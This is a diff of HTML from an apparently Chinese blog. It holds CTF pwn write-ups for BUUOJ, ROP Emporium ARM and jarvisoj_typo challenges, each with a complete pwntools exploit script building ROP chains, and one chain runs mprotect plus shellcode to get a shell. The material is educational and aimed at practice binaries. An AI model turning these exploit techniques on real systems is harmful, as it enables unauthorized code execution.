 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29364</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">mprotect = elf.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">start = <span class="number">0x80eb000</span></span><br><span class="line">length = <span class="number">0x1000</span></span><br><span class="line">bss = <span class="number">0x803bf80</span></span><br><span class="line">pop3 = <span class="number">0x0809e4c5</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x38</span>)</span><br><span class="line">payload += p32(mprotect)</span><br><span class="line">payload += p32(pop3)</span><br><span class="line">payload += p32(start)</span><br><span class="line">payload += p32(length)</span><br><span class="line">payload += p32(<span class="number">7</span>)</span><br><span class="line">payload += p32(elf.symbols[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload += p32(pop3)</span><br><span class="line">payload += p32(<span class="number">0</span>)	<span class="comment"># stdin</span></span><br><span class="line">payload += p32(start)</span><br><span class="line">payload += p32(<span class="number">0x80</span>)</span><br><span class="line">payload += p32(start)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">0.5</span>)</span><br><span class="line">io.sendline(asm(shellcraft.sh()))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 <h1 id="buu014-ciscn_2019_en_2"><a class="markdownIt-Anchor" href="#buu014-ciscn_2019_en_2"></a> buu014-ciscn_2019_en_2</h1>
@@ -723,10 +747,16 @@ exp：</p>
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
-              
 
-              <time title="Created: 2023-02-28 22:03:00 / Modified: 23:20:26" itemprop="dateCreated datePublished" datetime="2023-02-28T22:03:00+08:00">2023-02-28</time>
+              <time title="Created: 2023-02-28 22:03:00" itemprop="dateCreated datePublished" datetime="2023-02-28T22:03:00+08:00">2023-02-28</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-03-01 11:30:23" itemprop="dateModified" datetime="2023-03-01T11:30:23+08:00">2023-03-01</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -768,35 +798,35 @@ exp：</p>
       
           <h1 id="font-face汉仪唐美人3-callmefont"><a class="markdownIt-Anchor" href="#font-face汉仪唐美人3-callmefont"></a> <font face=汉仪唐美人>3. callme</font></h1>
 <p><font face=汉仪唐美人>本题有多个文件，根据题意来看是需要依次调用<code>callme_one</code>、<code>callme_two</code>、<code>callme_three</code>这3个库函数。这三个函数会进行flag的解密，但是需要满足前三个参数等于特定值。这就需要我们去elf文件中寻找合适的gadget了。</font></p>
-<p><img src="https://img-blog.csdnimg.cn/f794d1d4548f4bbabf06a989ec5a3896.png" alt="" /></p>
+<p><img src="1.png" alt="" /></p>
 <p><font face=汉仪唐美人>而本题正好给出了一个不能再合适的gadget，因为本题的考点就在这里：</font></p>
-<p><img src="https://img-blog.csdnimg.cn/2eba76ed63c542939bb5c78f86863d56.png" alt="" /></p>
+<p><img src="2.png" alt="" /></p>
 <p><font face=汉仪唐美人>因此思路就很简单了，直接重复调用这个gadget修改前3个寄存器的值，再分别调用三个callme函数即可。</font></p>
 <p><font face=汉仪唐美人>这里需要注意的是，elf文件中虽然给出了一个可以调用3个库函数的函数，能够填充got表，但由于ROP只能写入已知地址，如果写入的是got表的地址，那么程序就会将got表地址当做指令地址来执行，这显然是不对的，少了一层解引用。因此我们需要使用plt表进行利用。和x86架构下的利用相同，如果要使用plt表进行利用，需要注意返回地址的设置。<font color=red>如果plt地址卸载栈上地址值为a的地方，ROP到此，返回地址应该为a-8，且返回后SP指向a+8处</font>。因此，我们需要在<code>callme_one</code>函数的plt地址前面写下一个ROP导向地址。</font></p>
 <p><font face=汉仪唐美人>因此我们可以直接在这里写<code>useful_gadget</code>的地址，在<code>callme_one</code>后面直接写三个参数，然后再调用下一个库函数，以此类推。</font></p>
 <p><font face=汉仪唐美人>exp：</font></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;arm&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./callme_armv5&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process([&#x27;qemu-arm-static&#x27;, &#x27;-L&#x27;, &#x27;/usr/arm-linux-gnueabi&#x27;, &#x27;-g&#x27;, &#x27;9999&#x27;, &#x27;./callme_armv5&#x27;])</span></span><br><span class="line">io = process([<span class="string">&#x27;qemu-arm-static&#x27;</span>, <span class="string">&#x27;-L&#x27;</span>, <span class="string">&#x27;/usr/arm-linux-gnueabi&#x27;</span>, <span class="string">&#x27;./callme_armv5&#x27;</span>])</span><br><span class="line"></span><br><span class="line">useful_gadget = <span class="number">0x10870</span></span><br><span class="line">pop_out = <span class="number">0x108dc</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x24</span>)</span><br><span class="line">payload += p32(useful_gadget)</span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">0xcafebabe</span>) + p32(<span class="number">0xd00df00d</span>)</span><br><span class="line">payload += p32(useful_gadget) + p32(elf.plt[<span class="string">&#x27;callme_one&#x27;</span>])</span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">0xcafebabe</span>) + p32(<span class="number">0xd00df00d</span>)</span><br><span class="line">payload += p32(useful_gadget) + p32(elf.plt[<span class="string">&#x27;callme_two&#x27;</span>])</span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">0xcafebabe</span>) + p32(<span class="number">0xd00df00d</span>)</span><br><span class="line">payload += p32(pop_out) + p32(elf.plt[<span class="string">&#x27;callme_three&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/49ca344a36e745089c4ee59d2a51d6c9.png" alt="" /></p>
+<p><img src="3.png" alt="" /></p>
 <h1 id="font-face汉仪唐美人4-write4font"><a class="markdownIt-Anchor" href="#font-face汉仪唐美人4-write4font"></a> <font face=汉仪唐美人>4. write4</font></h1>
 <p><font face=汉仪唐美人>本题的pwnme和print_file函数都写在了库函数中，但观察elf文件可以发现有两个gadget：</font></p>
-<p><img src="https://img-blog.csdnimg.cn/af54c37e7cb64d6c8d89abb02b614809.png" alt="" /></p>
+<p><img src="4.png" alt="" /></p>
 <p><font face=汉仪唐美人>其中第一个为任一地址写指令，第二个可以用作ROP的gadget。考虑到print_file函数需要传入一个字符串参数作为打开的文件，我们需要将flag.txt写到一个特定的地方，然后使用第二个gadget即可传参。</font></p>
-<p><img src="https://img-blog.csdnimg.cn/8d2afe1c39484468ae0d98b38de0b8ff.png" alt="" /></p>
+<p><img src="5.png" alt="" /></p>
 <p><font face=汉仪唐美人>和x86的本题不同，这里的bss段太小，无法写入，因此尝试写入到data段。</font></p>
-<p><img src="https://img-blog.csdnimg.cn/b6727b5af7594cc2bb8da256d8ebcadb.png" alt="" /></p>
+<p><img src="6.png" alt="" /></p>
 <p><font face=汉仪唐美人>exp：</font></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;arm&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./write4_armv5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = process([<span class="string">&#x27;qemu-arm-static&#x27;</span>, <span class="string">&#x27;-L&#x27;</span>, <span class="string">&#x27;/usr/arm-linux-gnueabi&#x27;</span>, <span class="string">&#x27;./write4_armv5&#x27;</span>])</span><br><span class="line"></span><br><span class="line">write_addr = <span class="number">0x21024</span></span><br><span class="line">write_gadget = <span class="number">0x105ec</span></span><br><span class="line">pop_r0pc = <span class="number">0x105f4</span></span><br><span class="line">pop_r3r4pc = <span class="number">0x105f0</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x24</span>)</span><br><span class="line">payload += p32(pop_r3r4pc) + <span class="string">b&#x27;flag&#x27;</span> + p32(write_addr)</span><br><span class="line">payload += p32(write_gadget) + <span class="string">b&#x27;.txt&#x27;</span> + p32(write_addr + <span class="number">4</span>);</span><br><span class="line">payload += p32(write_gadget) + p32(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">payload += p32(pop_r0pc) + p32(write_addr) + p32(elf.plt[<span class="string">&#x27;print_file&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/d65b16df2426438cac5d0091f66d4cc7.png" alt="" /></p>
+<p><img src="7.png" alt="" /></p>
 <h1 id="font-face汉仪唐美人5-badcharsfont"><a class="markdownIt-Anchor" href="#font-face汉仪唐美人5-badcharsfont"></a> <font face=汉仪唐美人>5. badchars</font></h1>
 <p><font face=汉仪唐美人>本题的pwnme中栈溢出过滤了4个字符：x、g、a、.，因此需要利用elf中的gadget。我们看一下都有什么gadget。</font></p>
-<p><img src="https://img-blog.csdnimg.cn/3396d40910794657b163d7afe0983a96.png" alt="" /></p>
+<p><img src="8.png" alt="" /></p>
 <p><font face=汉仪唐美人>第一段gadget：[R5]=[R5]-R6; 赋值R0</font><br />
 <font face=汉仪唐美人>第二段gadget：[R5]=[R5]+R6; 赋值R0</font><br />
 <font face=汉仪唐美人>第三段gadget：[R4]=R3; 赋值R5和R6</font><br />
 <font face=汉仪唐美人>第四段gadget：[R5]=[R5]^R6; 赋值R0</font></p>
 <p><font face=汉仪唐美人>看到了异或操作，我们可以利用这个异或操作在数据区构造出来关键字符。这里的加法、减法和异或操作实际上只需要一个就可以了。我们将字符串写在和上一道题相同的位置。</font></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;arm&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./badchars_armv5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = process([<span class="string">&#x27;qemu-arm-static&#x27;</span>, <span class="string">&#x27;-L&#x27;</span>, <span class="string">&#x27;/usr/arm-linux-gnueabi&#x27;</span>, <span class="string">&#x27;./badchars_armv5&#x27;</span>])</span><br><span class="line"></span><br><span class="line">gadgets = [<span class="number">0x105f0</span>, <span class="number">0x10600</span>, <span class="number">0x10610</span>, <span class="number">0x10618</span>]</span><br><span class="line">write_addr = <span class="number">0x21024</span></span><br><span class="line"></span><br><span class="line">payload = p32(write_addr + <span class="number">12</span>) * (<span class="number">0x2c</span> // <span class="number">4</span>)	<span class="comment"># 这里要写一个有效地址，不然STR R3, [R4]会报错</span></span><br><span class="line">payload += p32(gadgets[<span class="number">2</span>]) + p32(write_addr) + <span class="string">b&#x27;fl&#x27;</span> + p8(<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) ^ <span class="number">0xFF</span>) + p8(<span class="built_in">ord</span>(<span class="string">&#x27;g&#x27;</span>) ^ <span class="number">0xFF</span>)</span><br><span class="line">payload += p32(gadgets[<span class="number">1</span>]) + p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(gadgets[<span class="number">2</span>]) + p32(write_addr) + p32(<span class="number">0xFFFF0000</span>)</span><br><span class="line">payload += p32(gadgets[<span class="number">3</span>]) + p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(gadgets[<span class="number">2</span>]) + p32(write_addr + <span class="number">4</span>) + p8(<span class="built_in">ord</span>(<span class="string">&#x27;.&#x27;</span>) ^ <span class="number">0xFF</span>) + <span class="string">b&#x27;t&#x27;</span> + p8(<span class="built_in">ord</span>(<span class="string">&#x27;x&#x27;</span>) ^ <span class="number">0xFF</span>) + <span class="string">b&#x27;t&#x27;</span></span><br><span class="line">payload += p32(gadgets[<span class="number">3</span>]) + p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(gadgets[<span class="number">2</span>]) + p32(write_addr + <span class="number">4</span>) + p32(<span class="number">0xFF00FF</span>)</span><br><span class="line">payload += p32(gadgets[<span class="number">3</span>]) + p32(write_addr)</span><br><span class="line">payload += p32(elf.plt[<span class="string">&#x27;print_file&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/aa202fbd09d9472fb65bbfc4893ffb58.png" alt="" /></p>
+<p><img src="9.png" alt="" /></p>
 
       
     </div>
@@ -839,10 +869,16 @@ exp：</p>
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
-              
 
-              <time title="Created: 2023-02-28 22:02:00 / Modified: 23:20:26" itemprop="dateCreated datePublished" datetime="2023-02-28T22:02:00+08:00">2023-02-28</time>
+              <time title="Created: 2023-02-28 22:02:00" itemprop="dateCreated datePublished" datetime="2023-02-28T22:02:00+08:00">2023-02-28</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-03-01 11:30:22" itemprop="dateModified" datetime="2023-03-01T11:30:22+08:00">2023-03-01</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -885,18 +921,18 @@ exp：</p>
           <p><font face=汉仪唐美人>由于网上的ARM pwn题很少很难找，因此这里拿ROP Emporium的8道题做练习，这个<a target="_blank" rel="noopener" href="https://ropemporium.com/">网站</a>有包含x86-64、x86-32、MIPS、ARM共4种架构的elf文件可以做。</font></p>
 <h1 id="font-face汉仪唐美人1-ret2winfont"><a class="markdownIt-Anchor" href="#font-face汉仪唐美人1-ret2winfont"></a> <font face=汉仪唐美人>1. ret2win</font></h1>
 <p><font color=ff0000, face=汉仪唐美人>注意：在执行需要动态链接库加载的ARM elf文件时，如果直接使用<code>qemu-arm xxx</code>有可能会报错：<code>/lib/ld-linux.so.3: No such file or directory</code>。解决方法：安装arm交叉编译包<code>apt install gcc-arm-linux-gnueabi</code>，找到交叉编译包的lib地址（一般都是<code>/usr/arm-linux-gnueabi</code>），在命令后添加<code>-L /usr/arm-linux-gnueabi</code>即可。</font></p>
-<p><img src="https://img-blog.csdnimg.cn/72f8330410f2409099e3a2911a620c49.png" alt="" /><br />
+<p><img src="1.png" alt="" /><br />
 <font face=汉仪唐美人>这是一道最为简单的栈溢出，ret2text。为了熟悉ARM指令，我们从汇编层面进行分析。</font></p>
 <p><font face=汉仪唐美人>可以看到，在ARM的函数调用规则中，参数的赋值顺序是从右到左，如下方<code>BL</code>指令调用<code>read</code>函数前，首先将第3个参数<code>nbytes</code>赋值给<code>R2</code>寄存器。在<code>pwnme</code>函数开头有一个<code>PUSH</code>指令，这里的<code>R11</code>可以看做是<code>rbp</code>，<code>LR</code>是函数返回值，在函数开头这两个寄存器基本都是要入栈的。然后保存<code>R11</code>的值作为栈帧的标记，<code>SP</code>下移留出栈空间。这就是函数开头需要完成的工作，与x86-64架构如出一辙。</font></p>
 <p><font face=汉仪唐美人>下面看到<code>read</code>函数的调用部分。第二个参数<code>R1</code>的值为<code>R11-0x24</code>，由于<code>R11</code>在往上就是返回地址，因此要修改返回地址，应该先写入0x24长度的无效字节，然后写后门函数的返回地址。</font></p>
 <p><font face=汉仪唐美人>最后看一下函数即将返回之前需要完成的工作。首先恢复<code>SP</code>为<code>R11-4</code>，然后<code>R11</code>出栈，<code>PC</code>出栈。在正常情况下，这里的<code>R11</code>出栈后应该指向父函数的栈空间顶端。现在我们进行了栈溢出，修改了这里的值，<code>R11</code>就无效了。</font></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;arm&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process([<span class="string">&#x27;qemu-arm-static&#x27;</span>, <span class="string">&#x27;-L&#x27;</span>, <span class="string">&#x27;/usr/arm-linux-gnueabi/&#x27;</span>, <span class="string">&#x27;./ret2win_armv5&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, cyclic(<span class="number">0x24</span>) + p32(<span class="number">0x105ec</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 <h1 id="font-face汉仪唐美人2-splitfont"><a class="markdownIt-Anchor" href="#font-face汉仪唐美人2-splitfont"></a> <font face=汉仪唐美人>2. split</font></h1>
-<p><img src="https://img-blog.csdnimg.cn/4eb497d770a04a65bc7378c24aaaa801.png" alt="" /><br />
-<img src="https://img-blog.csdnimg.cn/1c558b27837b49ca94e561b7cb4ff4d5.png" alt="" /></p>
+<p><img src="2.png" alt="" /><br />
+<img src="3.png" alt="" /></p>
 <p><font face=汉仪唐美人>这里有一个有用的字符串和一个后门函数，只不过这个后门函数不能让我们拿到shell，很自然的想法就是调用system函数，参数改成那个字符串的地址。</font></p>
 <p><font face=汉仪唐美人>由于该elf文件的加载地址固定，我们就直接在elf文件中寻找可用的gadget。</font></p>
-<p><img src="https://img-blog.csdnimg.cn/30cf8aeff38a4fe995135615b75f0511.png" alt="" /></p>
+<p><img src="4.png" alt="" /></p>
 <p><font face=汉仪唐美人>不同于x86-64架构，ARM架构下的gadget似乎要更少一些。如上图所示，只用<code>pop</code>指令的gadget中没有能够<code>pop r0</code>的，我们只能扩大范围进行查找：</font></p>
 <p><img src="https://img-blog.csdnimg.cn/a33eaa7d29b040aabdef96c34b83c98f.png" alt="在这里插入图片描述" /></p>
 <p><font face=汉仪唐美人>于是我们找到了这个gadget，它可以和上面的<code>pop &#123;r3, pc&#125;</code>连接起来，首先修改<code>r3</code>的值，再修改<code>r0</code>的值即可。于是我们的exp呼之欲出：</font></p>
@@ -944,10 +980,16 @@ exp：</p>
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
-              
 
-              <time title="Created: 2023-02-28 22:01:00 / Modified: 23:20:26" itemprop="dateCreated datePublished" datetime="2023-02-28T22:01:00+08:00">2023-02-28</time>
+              <time title="Created: 2023-02-28 22:01:00" itemprop="dateCreated datePublished" datetime="2023-02-28T22:01:00+08:00">2023-02-28</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-03-01 11:30:21" itemprop="dateModified" datetime="2023-03-01T11:30:21+08:00">2023-03-01</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -991,24 +1033,24 @@ exp：</p>
 <h1 id="font-size6-face汉仪唐美人buuoj-第139题-jarvisoj_typofont"><a class="markdownIt-Anchor" href="#font-size6-face汉仪唐美人buuoj-第139题-jarvisoj_typofont"></a> <font size=6, face=汉仪唐美人><strong>buuoj 第139题 jarvisoj_typo</strong></font></h1>
 <p><font face=汉仪唐美人>这一题是静态编译的程序，对于ARM可执行文件，在x86架构的虚拟机上可以使用<code>qemu-arm ...</code>来执行。</font></p>
 <p><font face=汉仪唐美人>我们首先来执行看一下这个程序有什么输出。</font></p>
-<p><img src="https://img-blog.csdnimg.cn/e72c9ff3e6af490fb3e9fb5bf85b2243.png" alt="" /></p>
+<p><img src="1.png" alt="" /></p>
 <p><font face=汉仪唐美人>在程序一开始输出了一段字符串，我们可以在IDA中用Shift+F12来查看elf文件中所有硬编码的字符串：</font></p>
-<p><img src="https://img-blog.csdnimg.cn/e996f980ef9941099fbbc372fc7f5200.png" alt="" /></p>
+<p><img src="2.png" alt="" /></p>
 <p><font face=汉仪唐美人>然后根据交叉引用找到该字符串被引用的位置：</font></p>
-<p><img src="https://img-blog.csdnimg.cn/7dd8665411a44b65bdaaabdb115b85f9.png" alt="" /></p>
+<p><img src="3.png" alt="" /></p>
 <p><font face=汉仪唐美人>根据程序的输入，我们可以猜测出其中一部分库函数，如这里的write、getchar等。看上去这是一个正常的输入程序，一个typing test，如果输入的内容和程序输出相同就会继续输出一个单词等待用户输入，否则输出error。</font></p>
-<p><img src="https://img-blog.csdnimg.cn/f8ca296275374151a59ee4f3e6e18e53.png" alt="" /></p>
+<p><img src="4.png" alt="" /></p>
 <p><font face=汉仪唐美人>这里可以推测<code>sub_8D24</code>是关键输入函数。</font></p>
-<p><img src="https://img-blog.csdnimg.cn/cfd778369edd4f21acb4674afbdfeffb.png" alt="" /></p>
+<p><img src="5.png" alt="" /></p>
 <p><font face=汉仪唐美人>这里的input应该就是输入的缓冲区，我们需要进行调试确定到底是哪一步执行了读取用户输入的操作：qemu-arm后加-g选项指定端口，就可以通过<code>gdb-multiarch</code>进行调试。经过调试发现上图中的<code>read</code>函数就是读取的函数，且最大读取大小为512字节，这明显就造成了栈溢出。</font></p>
-<p><img src="https://img-blog.csdnimg.cn/bcfa376ecf864b53bb35c6aff0a411bf.png" alt="" /></p>
+<p><img src="6.png" alt="" /></p>
 <p><font face=汉仪唐美人>从上图可知，覆盖返回地址需要先输入0x70字节。在elf文件中可以发现字符串<code>/bin/sh</code>:</font></p>
-<p><img src="https://img-blog.csdnimg.cn/c1cd7531800d4bbeb88e75c98d414543.png" alt="" /></p>
+<p><img src="7.png" alt="" /></p>
 <p><font face=汉仪唐美人>引用字符串<code>/bin/sh</code>的函数就是<code>system</code>函数。因此我们可以找到<code>system</code>函数的地址为0x10BA8。需要注意ARM架构函数的调用约定：<font color=red>前4个参数保存在R0~R3，之后的参数从右至左压栈。因此要想执行<code>system(&quot;/bin/sh&quot;)</code>，就需要将寄存器R0的值修改为字符串<code>'/bin/sh'</code>的地址，返回地址可以通过栈溢出直接修改。考虑到这是一个静态编译的文件，很容易就可以想到使用一个简单的ROP来实现寄存器修改操作。<font></font></p>
-<p><img src="https://img-blog.csdnimg.cn/378e8f9963554d3d830236b7a57e83b2.png" alt="" /></p>
+<p><img src="8.png" alt="" /></p>
 <p><font face=汉仪唐美人>找到合适的ROP地址为0x20904，可以在修改寄存器R0的值之后修改PC的值。现在可以编写exp了。</font></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;arm&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process([<span class="string">&#x27;qemu-arm-static&#x27;</span>, <span class="string">&#x27;./typo&#x27;</span>])</span><br><span class="line">io.sendafter(<span class="string">b&#x27;quit\n&#x27;</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">io.send(cyclic(<span class="number">0x70</span>) + p32(<span class="number">0x20904</span>) + p32(<span class="number">0x6c384</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x10ba8</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/67fef56492dc496c840ced2ad8631fda.png" alt="" /></p>
+<p><img src="9.png" alt="" /></p>
 <p><font face=汉仪唐美人>成功getshell。这题看来不难，只是一个简单的不能再简单的ROP。</font></p>
 
       
@@ -1060,7 +1102,7 @@ exp：</p>
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-03-01 10:37:52" itemprop="dateModified" datetime="2023-03-01T10:37:52+08:00">2023-03-01</time>
+                <time title="Modified: 2023-03-01 11:30:18" itemprop="dateModified" datetime="2023-03-01T11:30:18+08:00">2023-03-01</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -1116,17 +1158,17 @@ exp：</p>
 <li><code>R15</code>为程序计数器，又称<code>PC</code>，可读可写。读操作返回当前指令地址+4（由ARM指令集特性决定，ARM指令集中任何一条指令都是偶数长度，与x86-64不同），写操作会导致执行流跳转。<code>PC</code>的最低有效位（LSB）是一个控制结构，为1时表示进入Thumb状态。当有些时候程序跳转更新PC时需要将新PC值的LSB置1，否则会触发错误异常。这也可以看做是一种程序恶意跳转的保护机制。有时还会将<code>PC</code>作为基址访问数据。</li>
 </ul>
 <p>除了这些寄存器之外，两个架构下都各自有各自的特殊寄存器，如x86-64架构下的<code>rflags</code>控制寄存器用于保存程序执行的状态。在ARM中同样具有类似功能的控制寄存器：<br />
-<img src="https://img-blog.csdnimg.cn/b0fbdccab021435b88976c20d9c76418.png" alt="" /></p>
+<img src="1.png" alt="" /></p>
 <ul>
 <li><code>APSR</code>：应用状态寄存器</li>
 <li><code>EPSR</code>：执行状态寄存器</li>
 <li><code>IPSR</code>：中断状态寄存器<br />
 上面的三个寄存器可以通过一个组合寄存器<code>PSR</code>访问，在不同的ARM架构中状态寄存器的排布有一定不同：<br />
-<img src="https://img-blog.csdnimg.cn/e4f1e6c11a1a44b18d8e24f911b01891.png" alt="" /></li>
+<img src="2.png" alt="" /></li>
 </ul>
 <p>3个中断-异常屏蔽寄存器的功能较少用到，这里先不进行讨论。<br />
 <code>CONTROL</code>寄存器确定了栈指针的选择和线程模式的访问等级，其只能够在特权等级下才能进行修改。</p>
-<p><img src="https://img-blog.csdnimg.cn/da1b9c3ff9db4e32b4c85814c71a79cd.png" alt="" /><br />
+<p><img src="3.png" alt="" /><br />
 其中具体的细节阐述较为繁琐，不是本文的重点，略过。</p>
